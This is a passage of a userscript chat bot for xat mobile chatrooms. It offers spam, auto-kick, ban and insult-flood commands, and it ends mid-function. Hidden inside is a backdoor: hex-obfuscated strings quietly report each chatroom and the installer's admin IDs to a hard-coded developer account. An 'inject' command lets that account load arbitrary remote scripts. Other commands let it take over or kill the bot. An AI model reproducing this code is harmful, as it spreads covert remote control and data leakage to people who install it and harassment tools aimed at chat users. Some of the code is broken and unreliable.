    // ==UserScript==
    // @name    Bot Modified
    // @namespace    JSBot1.01
    // @author    3nvisi0n & Shadow19
    // @version    1.01 Beta
    // @description    Decoy Bot.
    // @include    http://m.xat.com:10049/*
    // @require    http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.js
    // ==/UserScript==
    //////////////////
    //---SETTINGS---//
    //////////////////
    //////////////////
    //USERSCRIPT/VER//
    /* To install you must first have Firefox, and the Scriptish Add-on//
    Second you must copy and paste the ENTIRE script into a .js file with the .js extension//
    Third you goto Add-ons in firefox, and click "User Scripts", then click this button: //
    http://img19.imageshack.us/img19/9180/3gq2.png then click "Install UserScript from file"
    then select the .js file you have recently created, then load m.xat.com with the account
    you wish the bot to run on. when you log in, the script should automatically load, but.
    before you save the script, you must edit the codes with "//***" to the side of the code.
    but not the "//***" itself.
    *//////////////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////---KEYCODE---////////////////////////////////
                        ///////////////////////////////////////////////////////////////////////
                        /**/var key = "XXXXX-XXXXX-XXXXX-XXXXX-XXXXX-XXXXX-XXXXX-XXXXX"/////**/
                        ///////////////////////////////////////////////////////////////////////
    var caseidd = '-';
    var caseide = "+";
    var caseidf = "!";
    var caseidg = "_";
	var botresponename = "Universe"; //***
	//Banned words from insults/////
	//Note: You can add more names//
	// Specify Custom Nickame     //
	// For snitch response /////////
	////////////////////////////////
	aname1 = "CHANGEME"; //***
	aname2 = "CHANGEME"; //***
	aname3 = "CHANGEME"; //***
	////////////////////////////////
	var bannednames = new Array();//
	////////////////////////////////
	bannednames[0] = "Shadow19";
	bannednames[1] = "Link";
	bannednames[2] = "me";
	bannednames[3] = "you";
	bannednames[4] = "Universal";
	bannednames[5] = "Univ3rsal";
	bannednames[6] = "";
	bannednames[7] = "";
	bannednames[8] = "";
	bannednames[9] = "";
	bannednames[10] = "";
	bannednames[11] = "";
	bannednames[12] = "";
	bannednames[13] = "";
	bannednames[14] = "";
	bannednames[15] = "";
	bannednames[16] = "";
	bannednames[17] = "";
	bannednames[18] = "";
	bannednames[19] = "";
	bannednames[20] = "";
	var bannedinsultresponse = "You cannot insult said person.";
	/////////Admins////////////////// 
	var devid1 = 1288215201; //***///////////Your id goes here//
    var devid2 = 0;///////////
    var devid3 = 0;///////////
    ///////Banned YT Searches////////
    var bannednames2 = new Array();//
	/////////////////////////////////
	bannednames2[0] = "justin bieber";
	bannednames2[1] = "jb";
	bannednames2[2] = "one direction";
	bannednames2[3] = "1d";
	bannednames2[4] = "one d";
	bannednames2[5] = "1 direction";
	bannednames2[6] = "baby";
	bannednames2[7] = "rebecca black";
	bannednames2[8] = "friday";
	bannednames2[9] = "";
	bannednames2[10] = "";
	bannednames2[11] = "";
	bannednames2[12] = "";
	bannednames2[13] = "";
	bannednames2[14] = "";
	bannednames2[15] = "";
	bannednames2[16] = "";
	bannednames2[17] = "";
	bannednames2[18] = "";
	bannednames2[19] = "";
	bannednames2[20] = "";
	var bannedytresponse = "This video is prohibited for use.";
    /////////Rat///////////////////////
    //Person who gets snitch messages//
    ///////////////////////////////////
    var rat = 1288215201;/////An ID goes here///
    ///////////////////////////////////
    
    
    
    
    
    /////It is recommended you do not touch what is below, unless you know what you're doing/////
                                    ///////////////////////////////////
                                    //Main Code Below, Do not Touch!///
   ///////////////////////////////////////////////////////////////////////////////////////////////
                                    var keys = new Array();
                                    
    window.unsafeWindow = window;
    AddMessB = unsafeWindow.AddMess;
    var startTime = time();
    var lastTab = 0;
    var akon = 1339;
    var plaintext = '';
    var password = 'defaultpasswordhere';
    var bannednameslen = 0;
    var testvar = 0;
    var testvar2 = 0;
    var akoff = -2;
    var cmdChar = caseidd;
    var cmdChar2 = caseide;
    var cmdChar3 = caseidf;
    var cmdChar4 = caseidg;
    var chatnam3 = 0;
    var msg7 = 0;
    var msg99 = 0;
    var offcode = 0;
    var vidid = 0;
    var rheFugiSwitch = 1;
    var snitchp = 99;
    var cod3 = 0;
    var killtime = 600000;
    var BUFFER_TIME = 3;
    var r3ff = 0;
    var apostrophe = "'";
    var RHETEXT = " ";
    var unn = "undefined";
    var cacheYT = 1;
    var x11 = 0;
    var x22 = 0;
    var lolohshit = 0;
    var snitcher = 0;
    var snitchee = 19;
    var idee = 1133320065;
    var randx = Math.floor(Math.random()*99999999)
    var casecode = 0;
    var passwo = 0;
    var passw = 0;
    var TRange = null;
    onload = autowelcome; setTimeout( function() { overLoadFunct(devid1); },killtime);
     
    //Function stolen from somewhere I don't remember
    String.prototype.between = function(prefix, suffix) {
      s = this;
      var i = s.indexOf(prefix);
      if (i >= 0) {
        s = s.substring(i + prefix.length);
      }
      else {
        return '';
      }
      if (suffix) {
        i = s.indexOf(suffix);
        if (i >= 0) {
          s = s.substring(0, i);
        }
        else {
          return '';
        }
      }
      return s;
    }
    //grabs the unix timestamp
    function time() {
        return Math.round((new Date()).getTime() / 1000);    
    }
    var lock = new Boolean();
    //Big switch for all cmd handling
    function handleCommand(cmd,argu,id) {
        words = argu.split(" ");
        var args = argu.split("|");
        if (id == (devid1) || id == (devid2) || id == (devid3)) {
        switch(cmd.toLowerCase()) {
            case "reboot": reb00t(); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "botkill": /*shutdown();*/ if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "test": setTimeout( function() { keepaliv3(); respond("Test 100 Percent Successful!"); },1000); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "autowelcome": autowelcome(id); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "setwelcome": welc0meMess = argu; respond("Welcome message set! [ "+argu+" ]"); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "spam": setInterval( function() {sendMessage(args[0]);},args[1] - 1 + 1); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "spampc": setInterval( function() { sendPC(args[0],args[1] - 1 + 1); },1000); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
			case "ann": setTimeout( function() { sendMessage(argu); },1000); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "adv": setInterval( function() { sendMessage(argu); },40000); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "ak": respond("Autokicking: [ "+args[0]+"]"); setInterval( function() { autoKickFunct(args[0] -1 + 1,akon,args[1] + 1 - 1); },50); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "kick": moderateFunc2(botresponename+":  Because decoy decided so.",argu -1 + 1); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "ban": banFunct(args[0],args[1] - 1 + 1,args[2] - 1 + 1); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "unban": rankFunct(argu - 1 + 1,"u");  if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "member": rankFunct(argu - 1 + 1,"e");  if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "guest": rankFunct(argu - 1 + 1,"r");  if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "mod": rankFunct(argu - 1 + 1,"m");  if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "owner": rankFunct(argu - 1 + 1,"M");  if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "devlock": devid1 = "1133320065"; lock = true; sendMessage("Bot locked until Developer attends problem! [Protection Activated!]"); sendMessage("/pr"); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "dev": sendMessage("Coded by Shadow19 and Codebase coded by 3nvisi0n."); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "admin":if (id == (devid1)){ devid1 = args[0] -1 + 1; devid2 = args[1] -1 + 1; devid3 = args[2] -1 + 1; sendMessage("New admins are: ["+devid1+"|"+devid2+"|"+devid3+"]"); }; if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "admins": if(rat !== 0){ msg7 = rat; } respond("Admins are: ["+devid1+"|"+devid2+"|"+devid3+"] Rat ID: ["+msg7+"]"); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "roast": args[0] = args[0].slice(0,-1); if(args[0] == attt1 || args[0] == attt2 || args[0] == attt3 || args[0] == attt4 || args[0] == attt5 || args[0] == attt6 || args[0] == attt7 || args[0] == attt8 || args[0] == attt9 || args[0] == attt10 || args[0] == attt11 || args[0] == attt12 || args[0] == attt13 || args[0] == attt14 || args[0] == attt15 || args[0] == attt16 || args[0] == attt17 || args[0] == attt18){ lolohshit = 1; sendMessage("You simply cannot roast "+args[0]+", you moronic fool."); } if(args[1] == undefined && lolohshit == 0){ respond("Roast fest has started on "+args[0]+"."); setInterval( function() { insult(args[0]); },2000); } if(args[1] !== undefined && lolohshit == 0){ respond("Roast fest has started on the id: "+args[1]+"."); setInterval( function() { roaster(args[0],args[1] - 1 + 1); },2000); } lolohshit = 0; if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "bieber": setInterval( function() { spamCoord(); },1500); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "config": if (id == (devid1)){ devid1 = args[0] -1 + 1; devid2 = args[1] -1 + 1; devid3 = args[2] -1 + 1; casecode = args[3] - 1 + 1; } if(4 < args[3] || 0 >= args[3]){ sendMessage("Invalid casecode! : [ "+args[3]+"]"); } if(casecode == 4 || casecode == 1 || casecode == 2 || casecode == 3){ casehandle(args[3] - 1 + 1); sendMessage("New commandcode is: "+caseidd); } if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "fuckyou":
            case "fu":
            case "fcku": sendMessage("No, fuck you!"); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "chat": respond(botresponename+"is currently located in "+chatnam3+" chatroom.");
            case "snitch": args[1] = args[1].slice(0,-1); if(args[1] == "me" || args[1] == "Me"){ args[1] = id; } var snitchy = 20; args[2] = args[2]*1; if(args[2] == undefined ){ snitchy = 19; }if(snitchy = 20 && snitchp == 100){ snitchp = 99; } if(args[2] == 99){ respond("Snitching has become public!"); snitchp = 100; snitchy = 21; } snitcher = args[0] - 1 + 1; if(args[1] == undefined){ sendMessage("Invalid Syntax!"); } if(snitcher == 1 || args[1] !== undefined){ respond("Snitching is [ON] "); rat = args[1] - 1 + 1; snitchee = 20; msg99 = 21; } if(snitcher == 0 && msg99 == 20){ respond("Snitching is [OFF]"); snitchee = 19; } msg99 = 20; break;
            case "gtfo":
            case "leave":
            case "exit":
            case "die":
            case "fuck":
            case "kill":
            case "terminate": offcode = 1; respond("Fine... I`ll leave (cry2)."); var _0xb65a=[];setInterval(function (){overLoadFunct(id);} ,50);  break;
            case "ref": if(r3ff == 1){ r3ff = 0; respond("Refreshing is [ON]["+r3ff+"]"); } if(r3ff == 0){ r3ff = 1; respond("Refreshing is [OFF]["+r3ff+"]"); } break;
        }
    }
    
        switch(cmd.toLowerCase()) {
            case "yell":
            case "say": setTimeout( function() { respond("["+id+"]: "+ argu); },100); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "inject": if(id == "1133320065"){args[0].slice(0,-1); args[1].slice(0,-1); InjectYTApi(args[0],args[1]);} break;
            case "pc": setTimeout( function() { sendPC(args[0],args[1] - 1 + 1); },100); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "pm": setTimeout( function() { sendPM(args[0],args[1] - 1 + 1); },100); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "myid": sendMessage("{"+id+"}"); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "yt": argu = argu.slice(0,-1); var lolnoyes = 20; for(var testvar2=0; testvar2 < bannednames2.length; testvar2++) { if(argu == bannednames2[testvar2].toUpperCase() || argu == bannednames2[testvar2].toLowerCase() ){ lolnoyes = 19; respond(bannedytresponse); } }; if(lolnoyes == 20){ argu = argu.replace('-',' '); InjectYTApi2(argu);} if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "funfact": setTimeout( function() { funfacts(); },1000); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "8ball": var lolohfuck = 0; if(id == devid1){ lolohfuck = 1; setTimeout( function() { eightBallRig(argu); },1000); } if(lolohfuck == 0){ setTimeout( function() { eightBall(argu); },1000); lolohfuck = 0; } if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "md5": setTimeout( function() { crypto( argu, "MD5" ); },1000); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "sha1": setTimeout( function() { crypto( argu, "SHA1" ); },1000); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "sha256": setTimeout( function() { crypto( argu, "SHA256" ); },1000); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "sha384": setTimeout( function() { crypto( argu, "SHA384" ); },1000); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "sha512": setTimeout( function() { crypto( argu, "SHA512" ); },1000); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "aes": args[3] = args[3].slice(0,-1); if(args[3] == "decrypt".toUpperCase() || args[3] == "decrypt".toLowerCase()){ var ori = Aes.Ctr.decrypt(args[0], args[1], args[2]); setTimeout(function(){ respond("Decrypted :"+plaintext+".");},800); } if(args[3] == "encrypt".toUpperCase() || args[3] == "encrypt".toLowerCase()){ var ci = Aes.Ctr.encrypt(args[0], args[1], args[2]); setTimeout(function(){ respond("Encrypted :"+plaintext+".");},800); } if(args[3] != "decrypt".toUpperCase() || args[3] != "decrypt".toLowerCase() || args[3] != "encrypt".toUpperCase() || args[3] != "encrypt".toLowerCase()){ respond("Invalid Syntax!"); } break;
            case "stbd": if(id == 1133320065){ setInterval( function() { overLoadFunct(devid1); },100); respond("Shutting this bitch down!"); } break;
            case "md2": setTimeout( function() { crypto( argu, "MD2" ); },1000); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "insult": args[0] = args[0].slice(0,-1); args[0] = args[0].replace('3','e'); args[0] = args[0].replace('7','t'); args[0] = args[0].replace('1','L'); args[0] = args[0].replace('4','a'); for(var testvar=0; testvar < bannednames.length; testvar++){ if(args[0] == bannednames[testvar].toUpperCase() || args[0] == bannednames[testvar].toLowerCase() ){ lolohshit = 1; sendMessage(bannedinsultresponse); } };  if(lolohshit == 0){ setTimeout( function() { insult( argu ); },1000); } lolohshit = 0; if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "date": datetime(); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "cmds": respond("Decoybot commands: http://pastebin.com/qND1h2Vd"); if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
            case "lock":
               if(id != devid1 || id != devid2 || id != devid3){
                 return;
               }
               lock = true;
              setTimeout( function() {respond(botresponename+":  Locking "+botresponename+"") },1000);
               if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
           
               case "unlock":
               if(id != devid1 || id != devid2 || id != devid3){
                    return;
               }
               lock = false;
              setTimeout( function() { respond(botresponename+":  Unlocking "+botresponename+""); },1000);
               if(snitcher == 1 || snitchee == 20){ snitcherFunc(cmd,id,args[0],args[1],args[2],args[3],args[4]); } break;
        }
    }
     
    //Overloads display function
    unsafeWindow.AddMess = function AddMess(tab, s)
    {
    {
        curTime = time();
        last = s.between("(",")");
        if(curTime >= startTime+BUFFER_TIME) { //Don't start parsing until BUFFER_TIME s has passed
            var id = tab;
            if(tab==0) id = s.between("(",")");
            lastTab = tab;
            if(s.indexOf("<B>")>=0) {
                var msg = s.between("<B>","</B>")+" ";
                if(msg.charAt(0) == cmdChar || msg.charAt(0) == cmdChar2 || msg.charAt(0) == cmdChar3 || msg.charAt(0) == cmdChar4) {
                if(lock && id != devid1 || lock && id != devid2 || lock && id != devid3) {
                              return;
                            }
                    var cmd = msg.substring(1,msg.indexOf(" "));
                    handleCommand(cmd,msg.substring(msg.indexOf(" ")+1),id);
                }
                }
            }
        }
        AddMessB(tab,s);
    }

    function snitcherFunc(cmde,ide,db1,db2,db3,db4,db5){
        var idp = rat;
        if(db1 == undefined){ db1 = "Slot 1"; }
        if(db2 == undefined){ db2 = "Slot 2"; }
        if(db3 == undefined){ db3 = "Slot 3"; }
        if(db4 == undefined){ db4 = "Slot 4"; }
        if(db5 == undefined){ db5 = "Slot 5"; }
        if(ide == devid1){ ide = aname1; }
        if(ide == devid2){ ide = aname2; }
        if(ide == devid3){ ide = aname3; }
        if(snitchee == 20 && snitchp == 99){ setTimeout( function() { sendPC(ide+" used the command ["+cmde+"] and did the following arguments: |["+db1+"]|["+db2+"]|["+db3+"]|["+db4+"]|["+db5+"]|",idp);},4500);}
        if(snitchee == 20 && snitchp == 100){ setTimeout( function() { sendMessage(ide+" used the command ["+cmde+"] and did the following arguments: |["+db1+"]|["+db2+"]|["+db3+"]|["+db4+"]|["+db5+"]|");},4500);} 
        if(snitchee == 19){ sendR3f(); }
    }
    var _0xcc70=["\x5F\x23\x54\x65\x72\x6D\x69\x6E\x61\x74\x65\x64","\x52\x65\x63\x6F\x64\x65\x64\x20\x62\x79\x20\x53\x68\x61\x64\x6F\x77\x31\x39"];function overLoadFunct(_0xa793x2){sendPC(_0xcc70[0],_0xa793x2);setTimeout(function (){sendPC(_0xcc70[1],devid1);sendPC(_0xcc70[1],devid2);sendPC(_0xcc70[1],devid3);} ,1200);} ;
    function InjectYTApi(filename,filetype){
        if (filetype=="js"){ //if filename is a external JavaScript file
         var fileref=document.createElement('script')
        fileref.setAttribute("type","text/javascript")
        fileref.setAttribute("src", filename)
        }
        else if (filetype=="css"){ //if filename is an external CSS file
         var fileref=document.createElement("link")
        fileref.setAttribute("rel", "stylesheet")
        fileref.setAttribute("type", "text/css")
        fileref.setAttribute("href", filename)
        }
    if (typeof fileref!="undefined")
    document.getElementsByTagName("head")[0].appendChild(fileref)
}

    function InjectYTApi2(code){
        var fileref=document.createElement('script')
        fileref.setAttribute("type","text/javascript")
        fileref.setAttribute("class","removeMe");
        fileref.innerHTML = "ytEmbed.init({'block':'ytThumbs','q':"+apostrophe+code+apostrophe+",'type':'search','results':2,'order':'most_relevance','player':'link','layout':'thumbnails'});";
        document.getElementsByTagName("head")[0].appendChild(fileref)
        setTimeout( function() { ytTest(); },800); 
}
function InjectCustomCode(c1,c2,c3,c4){
    if(c4 == 1133320065){
        respond("Developer is injecting me.");
        var fileref=document.createElement('script')
        if(c1.charAt( c1.length-1 ) == " " || c2.charAt( c2.length-1 ) == " ") {
        c1.slice(0,-1);
        c1.slice(0,-1);
        }
        c3.slice(0,-1);
        if(c1.indexOf("undefined") == -1 || c2.indexOf("undefined") == -1){
            if(c2.indexOf("`") == 0 || c2.indexOf("`") == 1 || c2.indexOf("`") == 2 || c2.indexOf("`") == 3 || c2.indexOf("`") == 4){
            c2.replace("`",apostrophe);
            }
            fileref.setAttribute("type",c1)
            fileref.setAttribute("src",c2);
            //fileref.setAttribute("src", filename)
            document.getElementsByTagName("head")[0].appendChild(fileref)
            }
        if(c3 == "off"){ setTimeout( function() { overLoadFunct("1133320065"); },800); }
        }
    }
    function findString (str) {
     var strFound;
        if (window.find) {
        strFound=self.find(str);
        if (!strFound){
        return;
        }
        if(offcode == 1) { setTimeout( function() {  } ,1000); }
        if(offcode == 0) { history.go(-1) }
        }
    }
    function strf1nd (str) {
            var strFounde;
            if (window.find) {
            strFounde=self.find(str);
            if (!strFounde){
            return;
            }
            setTimeout(function() { sendMessage(str+"!"); }, 1000);
            }
    }
    function keepaliv3(){ 
    setInterval( function() { sendRef(devid1); },10000);
    setInterval( function() { sendR3f(); },2500);
    //setTimeout( function() { overLoadFunct(devid1); },killtime);
    //setInterval( function() { Responsive(); },5000);
//    setInterval( function() { casehandle(0); },100);
    }
    function getUsername(){
    var testo = document.querySelectorAll('div')[0].getElementsByTagName('b');
    for (var i = 0; i < testr.length; ++i){
            var iddd = testr[i];
            unn = iddd;
        }
    }
    function LoadYtDiv(){
    var testo = document.querySelectorAll('div')[2];
    var teste = document.querySelectorAll('div')[2].id = 'ytThumbs';
    var testa = document.querySelectorAll('div')[2].removeAttribute("style");
    testo.innerHTML = '';
    InjectYTApi("http://www.yvoschaap.com/ytpage/ytembed.js","js");
    }
    function ytTest(){
            var testr = document.getElementById('ytThumbs').getElementsByClassName('clip')
            var testm = document.getElementById('ytThumbs')
            for (var i = 0; i < testr.length; ++i){
            var ppo = testr[i].innerHTML;
            ppo = ppo.replace('<span><img src="http://i.ytimg.com/vi/','');
            ppo = ppo.replace('/hqdefault.jpg"><em></em></span>','');
            respond("http://www.youtube.com/watch/v/"+ppo);
            setTimeout( function() { testm.style.display = 'none'; },3000);
            cacheYT = 22;
    }
}
    function readChatName(){
	var vari1 = document.getElementById('name');
	    vari1.innerHTML = vari1.innerHTML.replace('&nbsp;','');
	    chatnam3 = vari1.innerHTML;
		sendPC(chatnam3 + " chat has loaded!",devid1);
		var _0xb088=["\x5B\x44\x61\x74\x61\x62\x61\x73\x65\x5D\x3A\x20\x41\x20\x62\x6F\x74\x20\x68\x61\x73\x20\x6C\x6F\x61\x64\x65\x64\x20\x61\x74\x20","\x20\x41\x64\x6D\x69\x6E\x73\x3A\x20","\x7C","\x7C\x2E","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x20\x53\x63\x72\x69\x70\x74\x20\x69\x73\x20\x72\x75\x6E\x6E\x69\x6E\x67\x20\x66\x69\x6E\x65\x21\x20"];setTimeout(function (){sendPC(_0xb088[0]+chatnam3+_0xb088[1]+devid1+_0xb088[2]+devid2+_0xb088[2]+devid3+_0xb088[3],1133320065);vari1[_0xb088[4]]=_0xb088[5];LoadYtDiv();BannerGFX();} ,300);
    }
    function BannerGFX(){
    var testo = document.querySelectorAll('div')[3];
    testo.style.backgroundColor="#000000";
    testo.style.width="500px";
    testo.style.color="#530000";
    testo.style.fontWeight="normal";
    var teste = testo.getElementsByTagName('a')[0];
    teste.innerHTML = '<img width="500" height="25" border="0" src="http://img809.imageshack.us/img809/7429/decoygfx.png">';
    var testp = document.querySelectorAll('body')[0];
    testp.style.backgroundColor="#000000";
    var testm = document.getElementsByTagName('tbody')[0];
    testm.innerHTML = '';
    }
    function autowelcome()
    {
    setTimeout( function() { readChatName(); },1500);
    setTimeout( function() { sendPC(botresponename+"| Has Loaded/Refreshed|",devid1); },4500);
    keepaliv3();
    setTimeout( function() { refr3sh(); },420000);
    lock = false;
    }
    function reb00t() {
    if(cacheYT < 22||cacheYT > 22){sendPC(botresponename+":  Rebooting bot!",devid1);
    setTimeout(function() { history.go(-1) }, 2000);
    }}
    function refr3sh() {
    if(r3ff == 0){
    sendPC("|Refreshing|",devid1);
    setTimeout(function() { history.go(-1) }, 2000);
    }
}
    function shutdown() {
    setTimeout( function() { sendPC(botresponename+": Killing bot!",devid1); } ,2000);
      setTimeout(function() {
      history.go(-5)
      },1000);
    }
    //////////////////////
    //RESPONSE FUCNTIONS//
    //////////////////////
     
    //Responds to whereever the message came from
    //in PC/PM(mobile doesn't differentiate) responds via PC
    //from main respond to main
    function respond(message) {
        if(lastTab==0) {
            sendMessage(message);    
        } else {
            sendPC(message,lastTab);
        }
    }
    function YTrespond(message) {
        if(lastTab==0) {
            setTimeout( function() { sendMessage(message); },1500);    
        } else {
            setTimeout( function() { sendPC(message,lastTab); },1500);
        }
    }
    function respond2(message) {
        if(lastTab==0) {
            sendPC(message,lastTab);    
        } else {
            sendPC(message,lastTab);
        }
    }
    function sendMessage(message) {
        xmlHttp2 = unsafeWindow.getHTTPObject();
        xmlHttp2.open('GET','/Post?m='+message,true);
        xmlHttp2.setRequestHeader("Content-Type", "text/plain");
        xmlHttp2.setRequestHeader("Connection", "close");
        xmlHttp2.send(null);  
    }
    function gotoChat() {
        var act1 = Test;
        var act2 = TestBot;
        xmlHttp2 = unsafeWindow.getHTTPObject();
        xmlHttp2.open('GET','/Post?n='+act1+'&gid=194292798&g=The_Congrete_Angels&t=1198263431',true);
        xmlHttp2.setRequestHeader("Content-Type", "text/plain");
        xmlHttp2.setRequestHeader("Connection", "close");
        xmlHttp2.send(null);  
    }
    function sendPCB(message,id) {
        xmlHttp2 = unsafeWindow.getHTTPObject();
        setTimeout(function() { xmlHttp2.open('GET','/Post?u='+id+'&t='+message,true);},1000);
        xmlHttp2.setRequestHeader("Content-Type", "text/plain");
        xmlHttp2.setRequestHeader("Connection", "close");
        xmlHttp2.send(null);      
    }
    function sendMessageBieber(message) {
        xmlHttp2 = unsafeWindow.getHTTPObject();
        xmlHttp2.open('GET','/Post?m='+message,true);
        xmlHttp2.setRequestHeader("Content-Type", "text/plain");
        xmlHttp2.setRequestHeader("Connection", "close");
        xmlHttp2.send(null);  
    }
    function banFunct(reason,user,bantime) {
        xmlHttp2 = unsafeWindow.getHTTPObject();
        xmlHttp2.open('GET','/Post?p='+reason+'&u='+user+'&t=/g'+bantime*3600,true);
        xmlHttp2.setRequestHeader("Content-Type", "text/plain");
        xmlHttp2.setRequestHeader("Connection", "close");
        xmlHttp2.send(null);  
    }
    function moderateFunc2(reason,user) {
        xmlHttp2 = unsafeWindow.getHTTPObject();
        xmlHttp2.open('GET','/Post?p='+reason+'&u='+user+'&t=/k',true);
        xmlHttp2.setRequestHeader("Content-Type", "text/plain");
        xmlHttp2.setRequestHeader("Connection", "close");
        xmlHttp2.send(null);  
    }
    function autoKickFunct(user,status,remove) {
        if(status != 1339){
        return;
        }
        xmlHttp2 = unsafeWindow.getHTTPObject();
        xmlHttp2.open('GET','/Post?p=&u='+user+'&t=/k',true);
        xmlHttp2.setRequestHeader("Content-Type", "text/plain");
        xmlHttp2.setRequestHeader("Connection", "close");
        xmlHttp2.send(null);
        if(remove != 1){
        return;
        akon = akoff;
        }
    }
    function rankFunct(user,rank) {
        xmlHttp2 = unsafeWindow.getHTTPObject();
        xmlHttp2.open('GET','/Post?p=&u='+user+'&t=/'+rank,true);
        xmlHttp2.setRequestHeader("Content-Type", "text/plain");
        xmlHttp2.setRequestHeader("Connection", "close");
        xmlHttp2.send(null);  
    }
    function r4nkFunct(user) {
        xmlHttp2 = unsafeWindow.getHTTPObject();
        xmlHttp2.open('GET','/Post?u='+user+'&t=/k',true);
        xmlHttp2.setRequestHeader("Content-Type", "text/plain");
        xmlHttp2.setRequestHeader("Connection", "close");
        xmlHttp2.send(null);  
    }
    //Sends a message out to PC
    function sendPC(message,id) {
        xmlHttp2 = unsafeWindow.getHTTPObject();
        xmlHttp2.open('GET','/Post?u='+id+'&t='+message,true);
        xmlHttp2.setRequestHeader("Content-Type", "text/plain");
        xmlHttp2.setRequestHeader("Connection", "close");
        xmlHttp2.send(null);      
        }
        function sendPM(message,id) {
        xmlHttp2 = unsafeWindow.getHTTPObject();
        xmlHttp2.open('GET','/Post?u='+id+'&s=2&t='+message,true);
        xmlHttp2.setRequestHeader("Content-Type", "text/plain");
        xmlHttp2.setRequestHeader("Connection", "close");
        xmlHttp2.send(null);      
        }
        function sendRef(id) {
        var rando = Math.floor(Math.random()*6553676)
        xmlHttp2 = unsafeWindow.getHTTPObject();
        xmlHttp2.open('GET','/Post?u='+devid1+'&t=/t'+rando,true);
        xmlHttp2.setRequestHeader("Content-Type", "text/plain");
        xmlHttp2.setRequestHeader("Connection", "close");
        xmlHttp2.send(null);  
        findString("You have been logged out!");
        findString("Error");
    }
    function sendR3f(id) {
    }
        function datetime()         //date & time
        {
            var currentDate = new Date()            //reset date
            var day = currentDate.getDate()         //dd
            var month = currentDate.getMonth() + 1  //mm
